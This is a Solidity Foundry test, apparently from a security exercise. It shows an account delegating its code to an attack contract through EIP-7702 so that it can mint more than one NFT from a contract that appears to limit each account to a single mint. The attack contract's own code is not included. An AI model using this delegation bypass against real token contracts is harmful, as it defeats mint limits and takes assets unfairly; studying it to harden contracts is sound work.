// SPDX-License-Identifier: MIT
pragma solidity ^0.8.30;

import {Test} from "forge-std/Test.sol";
import {UniqueNFT} from "./UniqueNFT.sol";
import {UniqueNFTAttack} from "./UniqueNFTAttack.sol";
import {IERC721} from "@openzeppelin/contracts/token/ERC721/IERC721.sol";

contract UniqueNFTTest is Test {
    UniqueNFT uniqueNFT;
    UniqueNFTAttack attackContract;

    function setUp() public {
        uniqueNFT = new UniqueNFT();
        attackContract = new UniqueNFTAttack();
    }

    function testMultiMintNFTForEOA() public {
        (address alice, uint256 ALICE_SK) = makeAddrAndKey("alice");
        vm.deal(alice, 1 ether);
        vm.startPrank(alice, alice);

        vm.signAndAttachDelegation(address(attackContract), ALICE_SK);

        UniqueNFTAttack(alice).attack(address(uniqueNFT));

        require(IERC721(address(uniqueNFT)).balanceOf(alice) > 1, "alice should have more than 1 NFT");

        vm.stopPrank();
    }
}
